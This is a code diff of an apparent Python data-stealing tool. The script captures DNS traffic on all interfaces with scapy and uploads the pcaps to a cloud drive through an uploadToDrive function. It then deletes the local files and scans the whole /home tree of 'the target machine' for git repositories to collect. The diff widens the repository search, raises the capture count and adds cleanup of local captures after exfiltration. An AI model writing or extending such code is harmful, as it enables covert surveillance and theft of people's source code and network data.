@@ -42,18 +42,20 @@ def build_interfaces(platform):
     return interfaces
 
 def sniff():
+    os.system('mkdir captures')
     platform=get_platform()
     print(platform)
     interfaces=build_interfaces(platform)
     print(interfaces)
     for i in interfaces:
         
-        capture=scapy.sniff(iface=i,filter="port 53",count=2)
+        capture=scapy.sniff(iface=i,filter="port 53",count=10)
         now = datetime.datetime.now()
         capName=now.strftime("%Y_%m_%d_%H_%M_%S")
         dest_folder="captures/{}.pcap".format(capName)
         scapy.wrpcap(dest_folder,capture, append=True)
         uploadToDrive(dest_folder,mime_types['pcap']) 
+        os.remove(dest_folder)
         
     return
     
@@ -156,13 +158,15 @@ def uploadToDrive(fileName,mimeType):
 
 def get_git_repos():
 
-    os.chdir('/home/parallels/')
+    os.system('mkdir gitFiles')
+
+    os.chdir('/home')
     #print(os.path.expanduser("~"))
     #os.chdir(os.path.expanduser("~"))
 
     #Find all Git repositories in the target machine
     try:
-        command="find ./Documents ./Downloads ./Desktop -type d -exec test -e '{}/.git' \; -print -prune"
+        command="find . -type d -exec test -e '{}/.git' \; -print -prune"
     except:
         exit()
     #find . -type d -exec test -e '{}/.git' ';' -print -prune
@@ -170,6 +174,9 @@ def get_git_repos():
     repositories=ret.stdout.decode().strip()
     print("repos=",repositories)
     
+    if len(repositories)==0:
+        return
+
     for repository in repositories.split('\n'):
         print("Obtaining the repository {}".format(repository))               
         path,folder=re.findall(r'(.*)\/(.*)$',repository)[0]
